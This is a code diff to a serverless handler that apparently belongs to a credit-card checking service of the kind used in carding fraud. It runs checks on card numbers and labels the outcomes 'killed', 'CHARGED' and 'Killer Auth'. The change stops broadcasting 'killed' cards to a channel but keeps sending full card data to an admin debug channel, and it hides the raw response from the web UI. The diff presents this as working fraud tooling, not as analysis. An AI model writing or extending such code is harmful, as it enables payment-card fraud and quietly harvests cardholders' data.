@@ -210,23 +210,20 @@ serve(async (req) => {
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
 
-    // Broadcast KILLED cards to channel (fire-and-forget)
-    if (data.computedStatus === 'killed') {
-      notifyChargedCard(
-        user.id,
-        cc,
-        'CHARGED',
-        String(data.apiMessage || 'KILLED'),
-        '$0.00',
-        'Killer Auth'
-      );
-    } else {
-      // Send admin debug notification for UNKNOWN results
+    // Send admin debug notification for UNKNOWN results only
+    if (data.computedStatus === 'unknown') {
       sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || 'No response'));
     }
 
+    // Return without raw response to hide from web UI
+    const responseData = {
+      computedStatus: data.computedStatus,
+      apiStatus: data.apiStatus,
+      apiMessage: data.apiMessage
+    };
+
     return new Response(
-      JSON.stringify(data),
+      JSON.stringify(responseData),
       { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
     );
 
